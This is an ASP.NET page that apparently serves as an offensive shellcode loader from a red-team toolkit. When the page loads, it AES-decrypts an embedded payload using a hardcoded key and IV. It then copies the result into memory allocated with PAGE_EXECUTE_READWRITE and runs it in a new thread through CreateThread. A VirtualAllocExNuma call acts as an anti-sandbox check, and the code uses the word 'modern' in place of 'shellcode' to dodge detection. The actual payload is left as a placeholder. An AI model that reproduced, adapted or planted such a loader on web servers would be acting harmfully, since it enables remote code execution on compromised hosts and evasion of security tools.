<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Management" %>

<script runat="server">

    // Import necessary functions for modern execution
    [System.Runtime.InteropServices.DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();


    // Constants for memory allocation types
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;


    // Base64 decode method
    public static byte[] FromBase64(string base64String)
    {
        return Convert.FromBase64String(base64String);
    }


    // convert a hex string to byte array
    static byte[] HexStringToByteArray(string hex)
    {
        return hex.Split(',')
                  .Select(h => Convert.ToByte(h.Trim().Replace("0x", ""), 16))
                  .ToArray();
    }

    public static byte[] ConvertHexStringToByteArray(string hex)
    {
        if (string.IsNullOrEmpty(hex) || hex.Length % 2 != 0)
            throw new ArgumentException("Invalid hex string.");

        return Enumerable.Range(0, hex.Length / 2)
                         .Select(x => Convert.ToByte(hex.Substring(x * 2, 2), 16))
                         .ToArray();
    }

    static byte[] DecryptAES(byte[] encryptedBytes, byte[] keyBytes, byte[] ivBytes)
    {
        using (Aes aes = Aes.Create())
        {
            aes.Key = keyBytes;
            aes.IV = ivBytes;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            {
                return PerformCryptography(encryptedBytes, decryptor);
            }
        }
    }

    // Perform cryptographic transformation (decryption in this case)
    static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
    {
        using (MemoryStream ms = new MemoryStream())
        {
            using (CryptoStream cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();
                return ms.ToArray();
            }
        }
    }

    // Example modern execution (this method can vary depending on how you're running the modern)
    public static void Executemodern(byte[] modern)
    {

        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
            return;
        }
   
        // Example of executing modern (simple version, ensure proper method in practice)
        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)modern.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(modern, 0, funcAddr, modern.Length);
        IntPtr qwerty = IntPtr.Zero;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, funcAddr, IntPtr.Zero, 0, ref qwerty);
        //WaitForSingleObject(hThread, 0xFFFFFFFF);
    }



    protected void Page_Load(object sender, EventArgs e)
    {


        byte[] aesKey = ConvertHexStringToByteArray("fb6625f20f40b8a7c17f663b775bc630eada2aa041cc1502b22a7294457fe09e");
        byte[] aesIV = ConvertHexStringToByteArray("4ff1991d6594595a28f4fefe40a7c32f");
        
        if (aesKey.Length != 32) // 256 bits = 32 bytes
        {
            throw new ArgumentException("Key must be 256 bits (32 bytes) for AES-256: "+ aesKey.Length);
        }

        if (aesIV.Length != 16) // IV is always 128 bits = 16 bytes for AES
        {
            throw new ArgumentException("IV must be 128 bits (16 bytes) for AES.");
        }

        byte[] modern = null; // Declare modern outside the if block

       // Check key length and decrypt
       if (aesKey.Length == 16 || aesKey.Length == 24 || aesKey.Length == 32)
        {
                // AES encrypted modern (replace with your actual encrypted modern)
                // see Linux/Python/encrypt.py for encoding the shellcode
                byte[] encryptedBytes = Convert.FromBase64String("b64 encrypted shellcode here");
                                modern = DecryptAES(encryptedBytes, aesKey, aesIV);
                if (modern == null)
                {
                    Response.Write("Decryption failed. modern is null.<br />");
                    return;
                }

                
                byte[] runner = HexStringToByteArray(Encoding.UTF8.GetString(modern));

                Executemodern(runner);

        }
        else
        {
            Response.Write("Invalid key length. Key must be 16, 24, or 32 bytes.<br />");
        }

    }

</script>